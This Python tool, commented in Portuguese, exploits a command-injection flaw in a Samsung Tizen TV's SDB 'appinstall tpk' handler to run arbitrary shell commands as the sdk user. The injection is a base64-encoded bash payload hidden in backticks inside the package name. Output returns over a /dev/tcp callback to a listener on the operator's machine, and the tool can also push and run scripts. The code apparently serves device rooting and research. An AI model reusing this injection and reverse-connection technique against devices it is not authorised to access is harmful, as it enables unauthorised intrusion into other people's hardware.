#!/usr/bin/env python3
"""Fala com a TV por SDB sem precisar de shell interativo.

O shell normal do SDB e fechado nesta TV. O caminho usado aqui e o mesmo do
samsung-tv-root e do Couchroot: o nome do pacote em ``0 appinstall tpk <nome>``
vai para um comando de shell sem escape, entao um nome com crases executa um
comando como ``uid=901(sdk)``.

Exemplos:
    py -3 tools/tv.py info
    py -3 tools/tv.py shell "id; vconftool get db/appfw/home_appid"
    py -3 tools/tv.py push arquivo.dll /home/owner/share/tmp/sdk_tools/arquivo.dll
    py -3 tools/tv.py script tools/algum-script.sh
"""
from __future__ import annotations

import argparse
import base64
import os
import pathlib
import secrets
import socket
import subprocess
import sys
import tempfile
import threading
import time

DEFAULT_TV = os.environ.get("KURUMI_TV", "192.168.1.50")
SDB_PORT = 26101
STAGING = "/home/owner/share/tmp/sdk_tools"
# O argumento inteiro de `sdb shell` fica abaixo do limite seguro de 510 bytes.
MAX_INJECTION = 500


def find_sdb() -> pathlib.Path:
    configured = os.environ.get("SDB")
    candidates = [configured] if configured else []
    candidates += [
        r"C:\tizen-studio\tools\sdb.exe",
        str(pathlib.Path.home() / "tizen-studio" / "tools" / "sdb.exe"),
    ]
    for name in candidates:
        if name and pathlib.Path(name).is_file():
            return pathlib.Path(name)
    raise SystemExit("sdb.exe nao encontrado; defina a variavel SDB")


def callback_host(tv: str) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
        probe.connect((tv, 9))
        return probe.getsockname()[0]


class Tv:
    def __init__(self, host: str, sdb: pathlib.Path | None = None) -> None:
        self.host = host
        self.sdb = sdb or find_sdb()
        self.serial = f"{host}:{SDB_PORT}"
        self.callback = callback_host(host)
        # A TV aceita uma injecao por vez; duas chamadas seguidas deixam o sdbd
        # preso ate o processo anterior terminar.
        self._lock = threading.Lock()

    def _run(self, arguments: tuple[str, ...], timeout: float = 30) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            (str(self.sdb), *arguments),
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )

    def connect(self) -> None:
        self._run(("connect", self.serial))

    def push(self, local: pathlib.Path, remote: str) -> None:
        result = self._run(("-s", self.serial, "push", str(local), remote), timeout=180)
        if result.returncode != 0 or "error:" in (result.stdout + result.stderr).lower():
            raise RuntimeError(f"push falhou: {result.stdout}{result.stderr}")

    @staticmethod
    def _injection(command: str) -> str:
        encoded = base64.b64encode(command.encode("utf-8")).decode("ascii")
        return (
            "new2.tpk`printf${IFS}%s${IFS}"
            + encoded
            + "|base64${IFS}-d|bash`.tpk"
        )

    def capture(self, command: str, timeout: float = 30) -> tuple[str, int]:
        """Roda um comando como sdk e devolve (saida, codigo de saida)."""
        with self._lock:
            return self._capture(command, timeout)

    def _capture(self, command: str, timeout: float) -> tuple[str, int]:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.callback, 0))
        listener.listen(1)
        listener.settimeout(timeout)
        port = listener.getsockname()[1]
        wrapped = (
            f"exec 3<>/dev/tcp/{self.callback}/{port};"
            f"{{ {command}; }} >&3 2>&3;"
            "printf '\\n[exit:%s]\\n' \"$?\" >&3;exec 3>&-"
        )
        injection = self._injection(wrapped)
        argument = "0 appinstall tpk " + injection

        def launch() -> None:
            try:
                self._run(("shell", argument), timeout=timeout + 15)
            except Exception:
                pass

        worker = threading.Thread(target=launch, daemon=True)
        worker.start()
        try:
            connection, _ = listener.accept()
        except TimeoutError as error:
            raise RuntimeError(
                f"a TV nao conectou de volta em {self.callback}:{port}; "
                "verifique o firewall do Windows"
            ) from error
        finally:
            listener.close()
        with connection:
            connection.settimeout(timeout)
            chunks: list[bytes] = []
            while True:
                try:
                    chunk = connection.recv(65536)
                except TimeoutError:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
        worker.join(timeout=5)
        # O appinstall volta antes do shell terminar; sem esta pausa a proxima
        # injecao encontra o gerenciador de pacotes ocupado e o sdbd trava.
        time.sleep(1.5)
        output = b"".join(chunks).decode("utf-8", errors="replace")
        marker = "[exit:"
        index = output.rfind(marker)
        if index < 0:
            return output, -1
        code_text = output[index + len(marker):].split("]", 1)[0]
        try:
            code = int(code_text)
        except ValueError:
            code = -1
        return output[:index].rstrip("\n"), code

    def run(self, command: str, timeout: float = 30) -> tuple[str, int]:
        """Roda um comando; usa um script temporario quando ele e longo."""
        wrapped_size = len(self._injection(
            f"exec 3<>/dev/tcp/{self.callback}/65535;{{ {command}; }}"
        )) + len("0 appinstall tpk ")
        if wrapped_size <= MAX_INJECTION:
            return self.capture(command, timeout)
        return self.run_script(command, timeout)

    def run_script(self, text: str, timeout: float = 30) -> tuple[str, int]:
        token = secrets.token_hex(6)
        remote = f"{STAGING}/.kurumi-{token}.sh"
        body = text if text.startswith("#!") else "#!/bin/sh\n" + text
        with tempfile.TemporaryDirectory(prefix="kurumi-tv-") as folder:
            local = pathlib.Path(folder) / "run.sh"
            local.write_text(body.replace("\r\n", "\n") + "\n", encoding="utf-8")
            self.push(local, remote)
        # O proprio comando apaga o script: nao dispare uma segunda injecao
        # logo em seguida, ou o sdbd fica ocupado.
        return self.capture(f". {remote}; rc=$?; /bin/rm -f {remote}; exit $rc", timeout)


def command_info(tv: Tv) -> int:
    checks = [
        ("id", "id"),
        ("tv", "grep -E '^(Model|Version|Build)=' /etc/prd_info.ini"),
        ("runtime", "/usr/bin/dotnet --list-runtimes"),
        ("memoria", "grep -E '^(MemTotal|MemAvailable|SwapTotal|SwapFree):' /proc/meminfo"),
        (
            "home",
            'for k in db/appfw/home_appid db/appfw/startup_appid '
            'db/appfw/booting_appid_backup db/first_screen/type '
            'db/menu/smart_hub/ontvsetting/auto_start; do vconftool get "$k"; done',
        ),
        (
            "home operation",
            "sqlite3 -readonly /opt/dbspace/user/5001/.appsvc.db "
            "\"select operation, app_id from app_default_info "
            "where operation='http://tizen.org/appcontrol/operation/main';\" 2>&1",
        ),
        ("capacidades", "getcap /usr/bin/dotnet /usr/sbin/sdbd-tarlauncher"),
        ("tar", "/usr/bin/tar --help | grep -- --to-command"),
    ]
    last = 0
    for label, command in checks:
        print(f"== {label}")
        output, last = tv.run(command, timeout=30)
        print(output)
    return last


def command_apps(tv: Tv) -> int:
    script = r"""
sqlite3 -readonly -header -column /opt/dbspace/.pkgmgr_parser.db "
select package, mainapp_id, package_type, package_removable, package_preload, package_system
from package_info
order by lower(package);" 2>&1
"""
    output, code = tv.run_script(script, timeout=45)
    print(output)
    return code


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--tv", default=DEFAULT_TV, help=f"IP da TV (padrao {DEFAULT_TV})")
    sub = parser.add_subparsers(dest="action", required=True)
    shell = sub.add_parser("shell", help="roda um comando como sdk")
    shell.add_argument("command")
    shell.add_argument("--timeout", type=float, default=30)
    script = sub.add_parser("script", help="envia um .sh e roda como sdk")
    script.add_argument("path")
    script.add_argument("--timeout", type=float, default=60)
    push = sub.add_parser("push", help="envia um arquivo para a TV")
    push.add_argument("local")
    push.add_argument("remote")
    sub.add_parser("info", help="resumo da TV")
    sub.add_parser("apps", help="lista os pacotes instalados")
    args = parser.parse_args()

    tv = Tv(args.tv)
    tv.connect()
    if args.action == "shell":
        output, code = tv.run(args.command, args.timeout)
        print(output)
        if code:
            print(f"[exit {code}]", file=sys.stderr)
        return code
    if args.action == "script":
        text = pathlib.Path(args.path).read_text(encoding="utf-8")
        output, code = tv.run_script(text, args.timeout)
        print(output)
        return code
    if args.action == "push":
        tv.push(pathlib.Path(args.local), args.remote)
        return 0
    if args.action == "info":
        return command_info(tv)
    if args.action == "apps":
        return command_apps(tv)
    return 2


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8")
    raise SystemExit(main())
